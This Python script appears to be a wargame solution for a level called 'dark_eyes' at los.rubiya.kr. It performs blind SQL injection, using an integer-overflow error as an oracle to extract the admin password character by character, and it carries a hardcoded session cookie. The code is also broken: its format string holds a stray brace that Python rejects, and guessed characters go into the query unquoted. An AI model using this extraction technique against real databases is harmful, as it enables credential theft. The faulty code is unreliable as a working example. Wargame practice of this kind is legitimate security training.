import urllib.request
import requests

url='https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php'
headers = { 'Cookie': 'PHPSESSID=saghrkfp5s6ev9kd23gbl134qe' }
pw=""

for i in range (1,33):
    for j in range(48, 123):
        if (j == 95):
            continue
        query='?pw=%27%20or%20id=%27admin%27%20and%20substr(mid(pw,{}},1))%20in%20({},%20abs(-(9223372036854775808)))%23'.format(i, chr(j))
        r = requests.get(url + query, headers=headers)
        if r.text.find("9223372036854775808") != -1:
            pw = pw + chr(j)
            print('substr(password,1,{}) is '.format(i), pw)
            break